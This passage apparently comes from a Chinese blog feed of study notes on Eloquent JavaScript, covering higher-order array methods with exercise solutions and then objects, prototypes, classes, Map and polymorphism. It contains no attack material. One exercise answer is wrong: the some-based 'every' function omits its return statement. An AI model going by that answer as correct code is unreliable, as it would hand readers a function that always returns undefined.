<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">textScripts</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获得数据集中可以识别的script</span></span><br><span class="line">  <span class="keyword">let</span> scripts = countBy(text, char =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> script = characterScript(char.codePointAt(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> script ? script.name : <span class="string">"none"</span>;</span><br><span class="line">  &#125;).filter(<span class="function">(<span class="params">&#123;name&#125;</span>) =&gt;</span> name != <span class="string">"none"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 计算script总数，避免文本中全部都是不在数据集中的script</span></span><br><span class="line">  <span class="keyword">let</span> total = scripts.reduce(<span class="function">(<span class="params">n, &#123;count&#125;</span>) =&gt;</span> n + count, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(total == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">"No scripts found"</span>;</span><br><span class="line">  <span class="comment">// 映射为字符串</span></span><br><span class="line">  <span class="keyword">return</span> scripts.map(<span class="function">(<span class="params">&#123;name, count&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.round(count * <span class="number">100</span> <span class="regexp">/ total)&#125;% $&#123;name&#125;`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">  &#125;).join(", "); </span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">console.log(textScripts('英国的狗说"woof", 俄罗斯的狗说"тяв"'));</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">/</span><span class="regexp">/ → 61% Han, 22% Latin, 17% Cyrillic</span></span></span></span><br></pre></td></tr></table></figure>
<p>函数收i按根据字符的名字计数，这一步使用了<code>characterScript</code>函数，并在如果字符不是任何script时用字符串”none”做了回退处理。filter可以过滤掉结果数组中name为”none”的数组元素，因为我们不想考虑那些元素。</p>
<p>为了计算百分比，我们需要计算字符的总数。如果没有有效字符被找到，那么返回一个特定的字符串。否则，用map方法形成一个个人类易读的字符串，然后用join方法拼接起来。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>JS中可以传递函数值给其他的函数是特别有用的。可以提供一个缺口，而调用这些传进来的函数获得的值，可以填上这个缺口。</p>
<p>数组提供了一系列的高阶方法。可以用<code>forEach</code>方法遍历数组中的元素。<code>filter</code>方法过滤元素，只留下函数返回值为true的元素。将数组中的元素通过一个函数转换用<code>map</code>方法。可以用<code>reduce</code>方法将数组中的所有元素组合成为一个值。<code>some</code>方法测试是否数组中有任何一个元素满足测试函数的条件。<code>findIndex</code>找到第一个匹配预测函数特征的元素位置。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="flattening"><a href="#flattening" class="headerlink" title="flattening"></a>flattening</h3><p>用<code>reduce</code>方法组合<code>concat</code>方法flatten一个二维数组，使其拥有原数组的所有元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrays = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>], [<span class="number">6</span>]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arrays.reduce(<span class="function">(<span class="params">arr, cur</span>) =&gt;</span> arr.concat(cur)));</span><br><span class="line"><span class="comment">// → [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure>

<h3 id="own-loop"><a href="#own-loop" class="headerlink" title="own loop"></a>own loop</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loop</span>(<span class="params">initial, test, update, body</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = initial; test(i); i = update(i)) &#123;</span><br><span class="line">    body(i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loop(<span class="number">3</span>, n =&gt; n &gt; <span class="number">0</span>, n =&gt; n - <span class="number">1</span>, <span class="built_in">console</span>.log);</span><br><span class="line"><span class="comment">// -&gt; 3</span></span><br><span class="line"><span class="comment">// -&gt; 2</span></span><br><span class="line"><span class="comment">// -&gt; 1</span></span><br></pre></td></tr></table></figure>

<h3 id="everything"><a href="#everything" class="headerlink" title="everything"></a>everything</h3><p>类似于<code>some</code>方法，数组也有一个<code>every</code>方法。在数组中所有元素都满足预测函数的时候返回<code>true</code>。换一种说法，<code>some</code>有点类似于<code>||</code>操作符作用到数组上。而<code>every</code>类似于<code>&amp;&amp;</code>操作符。</p>
<p><code>every</code>方法接收两个参数，一个数组和一个预测函数作为参数。写两个版本的<code>every</code>方法。一个用循环，一个用<code>some</code>方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">every</span>(<span class="params">array, test</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> element <span class="keyword">of</span> array) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!test(element)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">every</span>(<span class="params">array, test</span>) </span>&#123;</span><br><span class="line">  !array.some(<span class="function"><span class="params">element</span> =&gt;</span> !test(element))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="dominant-writing-direction"><a href="#dominant-writing-direction" class="headerlink" title="dominant writing direction"></a>dominant writing direction</h3><p>计算一串文本中主要的文字书写方向，由script对象的direction属性给出，可以是”ltr””rtl””ttb”。</p>
<p><code>characterScript</code>和<code>countBy</code>方法可能是有用的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dominantDirection</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="keyword">let</span> counts = countBy(text, char =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> script = characterScript(char.codePointAt(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> script ? script.direction : <span class="string">"none"</span>;</span><br><span class="line">  &#125;).filter(<span class="function">(<span class="params">&#123;name&#125;</span>) =&gt;</span> name != <span class="string">"none"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(counts.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">'ltr'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> counts.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.count &gt; b.count ? a : b).name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(dominantDirection(<span class="string">"Hello!"</span>));</span><br><span class="line"><span class="comment">// → ltr</span></span><br><span class="line"><span class="built_in">console</span>.log(dominantDirection(<span class="string">"Hey, مساء الخير"</span>));</span><br><span class="line"><span class="comment">// → rtl</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ6</title>
    <url>/2018/12/26/EJ6/</url>
    <content><![CDATA[<h1 id="对象的秘密生活"><a href="#对象的秘密生活" class="headerlink" title="对象的秘密生活"></a>对象的秘密生活</h1><p>第四章介绍了JS的对象。在编程文化中，我们有个叫做<em>object-oriented programming</em>的范式，也即是面向对象编程，就是将对象（和其相关概念）作为程序组织的中心原则。</p>
<p>即使没人同意它的定义，面向对象变成定形了许多编程语言的设计，包括JavaScript。这一章描述这些主意怎样被应用到JavaScript。</p>
<a id="more"></a>

<h2 id="封装（Encapsulation）"><a href="#封装（Encapsulation）" class="headerlink" title="封装（Encapsulation）"></a>封装（Encapsulation）</h2><p>面向对象编程的核心时将程序分成小的部分，而每一个小的部分只负责管理自己的状态。</p>
<p>用这种方式组织程序的话，可以保持很高的内聚性。负责程序其他部分的人不需要知道这部分程序的内部实现。每当这些local的细节变化的时候，只有附近的代码需要被修改。</p>
<p>以这种范式设计的程序的不同部分之间彼此的交互是通过接口(interface)的。接口就是以一种更加抽象的级别提供功能的函数或者变量的有限集，并隐藏具体功能的实现。</p>
<p>这样的程序片段用对象来建立模型。接口包含一个特定的方法和对象集合。作为接口的一部分的属性被称为是<code>public</code>的，而其他的，不应被外部代码看到的那些，被称为是<code>private</code>的。</p>
<p>许多语言提供了一种方式，用于区分共有和私有属性，并避免外部代码获取私有属性或者方法。JS，再一次实现了极简主义，没有这种方式，至少现在还没有。这项工作正在进行并即将添加到语言标准中。</p>
<p>虽然语言没有内建的区别。JS的编程人员也成功地运用这个主意。典型地，公共接口描述在文档或者注释中。也是很常见的，在属性名的开头放一个下划线(_)表明该属性是私有的。</p>
<p>将接口和实现分离是一个很棒的主意。通常被叫做封装(encapsulation)。</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>方法只是保存函数值的一个属性。这是一个简单的方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> rabbit = &#123;&#125;;</span><br><span class="line">rabbit.speak = <span class="function"><span class="keyword">function</span>(<span class="params">line</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`The rabbit says '<span class="subst">$&#123;line&#125;</span>'`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">rabbit.speak(<span class="string">"I'm alive."</span>);</span><br><span class="line"><span class="comment">// -&gt; The rabbit says 'I'm alive.'</span></span><br></pre></td></tr></table></figure>

<p>通常一个方法需要对调用它的对象进行一些什么操作。当一个函数作为方法调用的时候，一个叫做<code>this</code>的绑定在方法体中自动指向调用它的对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">speak</span>(<span class="params">line</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`The <span class="subst">$&#123;<span class="keyword">this</span>.type&#125;</span> rabbit says '<span class="subst">$&#123;line&#125;</span>'`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> whiteRabbit = &#123;<span class="attr">type</span>: <span class="string">"white"</span>, speak&#125;;</span><br><span class="line"><span class="keyword">let</span> hungryRabbit = &#123;<span class="attr">type</span>: <span class="string">"hungry"</span>, speak&#125;;</span><br><span class="line"></span><br><span class="line">whiteRabbit.speak(<span class="string">"Oh my ears and whiskers, "</span> + <span class="string">"how late it's getting!"</span>);</span><br><span class="line"><span class="comment">// → The white rabbit says 'Oh my ears and whiskers, how late it's getting!'</span></span><br><span class="line">hungryRabbit.speak(<span class="string">"I could use a carrot right now."</span>);</span><br><span class="line"><span class="comment">// → The hungry rabbit says 'I could use a carrot right now.'</span></span><br></pre></td></tr></table></figure>
<p>可以把<code>this</code>作为一个以不同的方式传进函数的额外的参数。如果想显式传递<code>this</code>，可以用函数的<code>call</code>方法，接收<code>this</code>值作为它的第一个参数，并将剩下的参数作为传递给函数的参数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">speak.call(hungryRabbit, <span class="string">"Burp!"</span>);</span><br><span class="line"><span class="comment">// -&gt; The hungry rabbit says 'Burp!'</span></span><br></pre></td></tr></table></figure>

<p>因为每个函数都有自己的<code>this</code>绑定，这个绑定的值取决于函数调用的方式，不能够将<code>this</code>当作以<code>function</code>定义的普通函数的外部作用域（wrapping scope）。</p>
<p><em>Since each function has its own this binding, whose value depends on the way it is called, you cannot refer to the this of the wrapping scope in a regular function defined with the function keyword</em></p>
<p>箭头函数是不同的，他们不绑定他们自己的<code>this</code>，但是可以看见他们周围作用域的<code>this</code>绑定。因此，你可以做类似下面所做的事情，从一个本地函数中引用<code>this</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">normalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.coords.map(<span class="function"><span class="params">n</span> =&gt;</span> n / <span class="keyword">this</span>.length));</span><br><span class="line">&#125;</span><br><span class="line">normalize.call(&#123;<span class="attr">coords</span>: [<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="attr">length</span>: <span class="number">5</span>&#125;);</span><br><span class="line"><span class="comment">// -&gt; [0, 0.4, 0.6]</span></span><br></pre></td></tr></table></figure>

<p>如果map中的函数使用<code>function</code>关键字书写，那么上述代码将不会正常工作。</p>
<h2 id="原型-prototypes"><a href="#原型-prototypes" class="headerlink" title="原型(prototypes)"></a>原型(prototypes)</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> empty = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(empty.toString);</span><br><span class="line"><span class="comment">// -&gt; function toString()&#123;..&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(empty.toString());</span><br><span class="line"><span class="comment">// -&gt; [object Object]</span></span><br></pre></td></tr></table></figure>
<p>我获取了一个空对象中的属性!</p>
<p>实际并不是这样，我保留了关于JS对象工作机制的一些信息。除了他们的属性集合，大多数的对象也有一个<code>prototype</code>。原型就是另外一个对象，被用于作为属性的回退source。当一个对象被请求一个他没有的属性，原型就会根据那个属性被搜索，然后是原型的原型等等。类似于JAVA中的类的继承，所有的类都继承自Object类，而继承链上还有可能有其他类。</p>
<p>所以空对象的原型是谁呢？它就是伟大的祖先原型，在所有对象后面的实体：<code>Object.prototype</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(&#123;&#125;) == <span class="built_in">Object</span>.prototype);</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(<span class="built_in">Object</span>.prototype));</span><br><span class="line"><span class="comment">// -&gt; null</span></span><br></pre></td></tr></table></figure>
<p><code>Object.getPrototypeOf</code>返回一个对象的原型。</p>
<p>JS对象的原型关系形成了一个树状结构，这个结构的根部是<code>Object.prototype</code>。它为所有对象提供了一些方法，如<code>toString</code>方法，将一个对象转换为字符串表示。</p>
<p>许多对象并不是直接把<code>Object.prototype</code>作为他们的原型，取而代之的是，还有一个对象提供一个不同的默认属性集。函数源自于<code>Function.prototype</code>,数组源自于<code>Array.prototype</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(<span class="built_in">Math</span>.max) ==</span><br><span class="line">            <span class="built_in">Function</span>.prototype);</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf([]) ==</span><br><span class="line">            <span class="built_in">Array</span>.prototype);</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>

<p>这种原型对象本身有一个原型，通常是<code>Object.prototype</code>，所以仍然间接提供了类似<code>toString</code>这样的方法。</p>
<p>可以使用<code>Object.create</code>去创造一个具有特定原型的对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> protoRabbit = &#123;</span><br><span class="line">  speak(line) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`The <span class="subst">$&#123;<span class="keyword">this</span>.type&#125;</span> rabbit says '<span class="subst">$&#123;line&#125;</span>'`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> killerRabbit = <span class="built_in">Object</span>.create(protoRabbit);</span><br><span class="line">killerRabbit.type = <span class="string">"killer"</span>;</span><br><span class="line">killerRabbit.speak(<span class="string">"SKREEEE!"</span>);</span><br><span class="line"><span class="comment">// → The killer rabbit says 'SKREEEE!'</span></span><br></pre></td></tr></table></figure>
<p>在对象表达式中的<code>speak(line)</code>是一种定义方法的简写形式。它创建一个属性名叫做<code>speak</code>并且指定这个函数作为它的值。</p>
<p>这个“原型”兔子作为一个为所有兔子共享属性的容器。一个独立的兔子对象，如killer兔子，包含它自身的苏偶偶属性，如<code>type</code>属性，以及从它的原型上继承的共享属性。</p>
<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>JS的原型系统可以被不正式地理解为面向对象中类的概念。一个类定义一种类型对象的形状-也就是拥有什么方法和属性。这样的对象叫做这个类(class)的实例(Instance)。</p>
<p>原型在定义所有实例共享的属性时，非常有用，比如方法。那些不同实例特有的属性，需要直接定义在对象本身。</p>
<p>所以为了创造一个给定类的实例，必须创造一个对象，这个对象衍生自合适的原型，但是还要确保这个原型有着这个类的实例应该拥有的属性。这就是构造器(constructor)函数所做的事情。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRabbit</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> rabbit = <span class="built_in">Object</span>.create(protoRabbit);</span><br><span class="line">    rabbit.type = type;</span><br><span class="line">    <span class="keyword">return</span> rabbit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JS提供了一种定义这种类型函数的更简单的方式。如果你在函数调用前放一个<code>new</code>，这个函数就会被当作构造器。这意味着一个拥有正确原型的对象会自动被创建，并绑定到函数中的<code>this</code>，在函数结尾返回。</p>
<p><em>The prototype object used when constructing objects is found by taking the prototype property of the constructor function.</em></p>
<p>构造对象时使用的原型对象是通过构造函数的prototype属性找到的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rabbit</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.type = type;</span><br><span class="line">&#125;</span><br><span class="line">Rabbit.prototype.speak = <span class="function"><span class="keyword">function</span>(<span class="params">line</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`The <span class="subst">$&#123;<span class="keyword">this</span>.type&#125;</span> rabbit says '<span class="subst">$&#123;line&#125;</span>'`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> weirdRabbit = <span class="keyword">new</span> Rabbit(<span class="string">"weird"</span>);</span><br></pre></td></tr></table></figure>

<p>构造器函数（事实上所有的函数）自动获得一个名为<code>prototype</code>的属性，默认保存着一个空的源自于<code>Object.prototype</code>的对象。如果你愿意的话可以用新的对象重写它。或者可以向已经存在的对象上添加新的属性，如例子中的那样。</p>
<p>约定俗成地，构造器的名字首字母大写，以便可以与其他函数区分开来。</p>
<p>理解prototype关联到构造器函数（通过prototype属性）的方式和对象有一个prototype（可以通过Object.getPrototypeOf得到）的区别是很重要的。实际的函数的prototype是<code>Function.prototype</code>，因为构造器是函数。它的<code>prototype</code>属性保存着原型，用于通过它创造实例的时候使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(Rabbit) ==</span><br><span class="line">            <span class="built_in">Function</span>.prototype);</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(weirdRabbit) ==</span><br><span class="line">            Rabbit.prototype);</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>

<h2 id="类标记"><a href="#类标记" class="headerlink" title="类标记"></a>类标记</h2><p>所以JS的类就是带有一个prototype属性的构造器函数。直到2015年，都是必须这样书写的。近来，我们有了一个不是那么尴尬的写法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rabbit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(type) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line">    speak(line) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`This <span class="subst">$&#123;<span class="keyword">this</span>.type&#125;</span> rabbit says '<span class="subst">$&#123;line&#125;</span>'`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> killerRabbit = <span class="keyword">new</span> Rabbit(<span class="string">"killer"</span>);</span><br><span class="line"><span class="keyword">let</span> blackRabbit = <span class="keyword">new</span> Rabbit(<span class="string">"black"</span>);</span><br></pre></td></tr></table></figure>
<p><code>class</code>关键字开始一个类声明，允许我们在一个地方定义一个构造器和一组方法。任何数量的方法可以写在声明大括号的里面。名为<code>constructor</code>的方法被特殊处理。<br>它提供了实际的构造器函数，将会绑定到<code>Rabbit</code>名下。而其他函数会被打包到构造器的<code>prototype</code>属性上。因此，上面的类声明等同于我们之前的构造器定义。只是看上去更漂亮。</p>
<p>类声明现在只允许方法，也就是保存着函数值的属性被添加到函数的<code>prototype</code>属性上去。如果想保存一个非函数值上去可能有点不太方便。下一个版本的JS可能会改进这个，现在只需要在定义类之后直接修改<code>prototype</code>即可。</p>
<p>类似<code>function</code>,<code>class</code>也可以被用于语句和表达式中。当被用在表达式中，没有定义一个绑定而只是提供作为一个值的构造器。可以在类表达式中省略类名。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> object = <span class="keyword">new</span> <span class="class"><span class="keyword">class</span> </span>&#123; getWord() &#123; <span class="keyword">return</span> <span class="string">"hello"</span>; &#125; &#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object.getWord());</span><br><span class="line"><span class="comment">// → hello</span></span><br></pre></td></tr></table></figure>

<h2 id="覆盖派生的属性"><a href="#覆盖派生的属性" class="headerlink" title="覆盖派生的属性"></a>覆盖派生的属性</h2><p>当为对象添加一个属性的时候，不管这个属性在不在原型中，都会被添加到对象本身。如果原型也有一个同名属性，那么原型上的同名属性将不再有效，将被新添加的属性覆盖。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Rabbit.prototype.teeth = <span class="string">"small"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(killerRabbit.teeth);</span><br><span class="line"><span class="comment">// → small</span></span><br><span class="line">killerRabbit.teeth = <span class="string">"long, sharp, and bloody"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(killerRabbit.teeth);</span><br><span class="line"><span class="comment">// → long, sharp, and bloody</span></span><br><span class="line"><span class="built_in">console</span>.log(blackRabbit.teeth);</span><br><span class="line"><span class="comment">// → small</span></span><br><span class="line"><span class="built_in">console</span>.log(Rabbit.prototype.teeth);</span><br><span class="line"><span class="comment">// → small</span></span><br></pre></td></tr></table></figure>

<p>下面的图片描绘了代码运行过后的情形。<code>Rabbit</code>和<code>Object</code>原型在killerRabbit后面作为一种背景，对象本身找不到的属性会被在这些原型中查找。</p>


<p>重写存在原型中的属性是个有用的事情。对于实例中出现的不寻常的对象的某个特定值，可以通过重写去隐藏掉原型上的值，而保持其他寻常的对象的值不变。</p>
<p>重写也用于给一个函数和数组原型不同的<code>toString</code>方法，而不是基本的对象原型。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.prototype.toString == <span class="built_in">Object</span>.prototype.toString);</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>,<span class="number">2</span>].toString());</span><br><span class="line"><span class="comment">// -&gt; 1, 2</span></span><br></pre></td></tr></table></figure>
<p>在一个数组上调用<code>toString</code>方法类似在数组上调用<code>join(&#39;,&#39;)</code>。将逗号作为分隔符置于数组值中间。直接调用<code>Object.prototype.toString</code>会产生一个不同的字符串。那个方法不知道数组，所以就在中括号之间生成一个<code>object</code>单词和对应的类型名。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.toString.call([<span class="number">1</span>,<span class="number">2</span>]));</span><br><span class="line"><span class="comment">// -&gt; [object Array]</span></span><br></pre></td></tr></table></figure>

<h2 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h2><p>我们之前看过<code>map</code>，通过对数据结构中的元素应用一个函数进行转换。令人困惑的是，同样的单词被用于描述一个相关但是不同的事情。</p>
<p>map是一个数据结构，关联键值对。例如，想要映射名字到年龄。我们可以使用对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ages = &#123;</span><br><span class="line">  Boris: <span class="number">39</span>,</span><br><span class="line">  Liang: <span class="number">22</span>,</span><br><span class="line">  Júlia: <span class="number">62</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Júlia is <span class="subst">$&#123;ages[<span class="string">"Júlia"</span>]&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// → Júlia is 62</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Is Jack's age known?"</span>, <span class="string">"Jack"</span> <span class="keyword">in</span> ages);</span><br><span class="line"><span class="comment">// → Is Jack's age known? false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Is toString's age known?"</span>, <span class="string">"toString"</span> <span class="keyword">in</span> ages);</span><br><span class="line"><span class="comment">// → Is toString's age known? true</span></span><br></pre></td></tr></table></figure>

<p>对象的属性名是人的名字，对应的值是年龄。但是我们并没有一个叫做toString的人，用in操作符得到的结果却是相反的。这是因为，对象派生自<code>Object.prototype</code>，看起来好像拥有这个属性。</p>
<p>使用普通对象作为map是危险的。有几种可能的方式避免这个问题。首先，是可以创造没有原型的对象的。如果传递<code>null</code>给<code>Object.create</code>，结果的对象将不会派生自<code>Object.prototype</code>，那么就可以安全的作为map使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"toString"</span> <span class="keyword">in</span> <span class="built_in">Object</span>.create(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br></pre></td></tr></table></figure>
<p>对象的属性名必须是字符串。如果需要一个map，并且key不能够很容易的转换为字符串，如对象，就不能用对象实现一个map。</p>
<p>幸运的是，JS有一个叫做Map的类就是用于创建map的。它存储映射并允许任何类型的键。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ages = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">ages.set(<span class="string">"Boris"</span>, <span class="number">39</span>);</span><br><span class="line">ages.set(<span class="string">"Liang"</span>, <span class="number">22</span>);</span><br><span class="line">ages.set(<span class="string">"Júlia"</span>, <span class="number">62</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Júlia is <span class="subst">$&#123;ages.get(<span class="string">"Júlia"</span>)&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// → Júlia is 62</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Is Jack's age known?"</span>, ages.has(<span class="string">"Jack"</span>));</span><br><span class="line"><span class="comment">// → Is Jack's age known? false</span></span><br><span class="line"><span class="built_in">console</span>.log(ages.has(<span class="string">"toString"</span>));</span><br><span class="line"><span class="comment">// → false</span></span><br></pre></td></tr></table></figure>

<p>set,get,has方法是Map对象接口的一部分。书写一个快速update和search的数据结构不是很容易地，但是有别人已经为我们写好了，并且我们可以使用这个接口使用他们的成果。</p>
<p>如果你确实想用一个对象实现map，知道<code>Object.keys()</code>只返回对象自己的键而不返回原型中的键是有用的。作为in操作符的替代，<code>hasOwnProperty</code>只对对象本身的属性返回true。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(&#123;<span class="attr">x</span>: <span class="number">1</span>&#125;.hasOwnProperty(<span class="string">"x"</span>));</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(&#123;<span class="attr">x</span>: <span class="number">1</span>&#125;.hasOwnProperty(<span class="string">"toString"</span>));</span><br><span class="line"><span class="comment">// → false</span></span><br></pre></td></tr></table></figure>

<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>当在对象上调用<code>String</code>函数的时候（将一个值转换为字符串），将会调用对象的<code>toString</code>方法去计算一个有意义的字符串表示这个对象。有一些原型定义了自己的<code>toString</code>方法，所以会返回比<code>[object Object]</code>更有意义的字符串。你也可以自己实现这种功能。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Rabbit.prototype.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`a <span class="subst">$&#123;<span class="keyword">this</span>.type&#125;</span> rabbit`</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">String</span>(blackRabbit));</span><br><span class="line"><span class="comment">// → a black rabbit</span></span><br></pre></td></tr></table></figure>

<p>这是一个伟大的想法的简单实例。当一段代码要与有特定接口（toString）的对象做交互时，任何种类的支持这种接口的对象都可以插进这段代码，并且它会正常运行。</p>
<p>这种技巧叫做多态（polymorphism)。多态代码可以各种不同类型的值，只要他们支持期望的接口。</p>
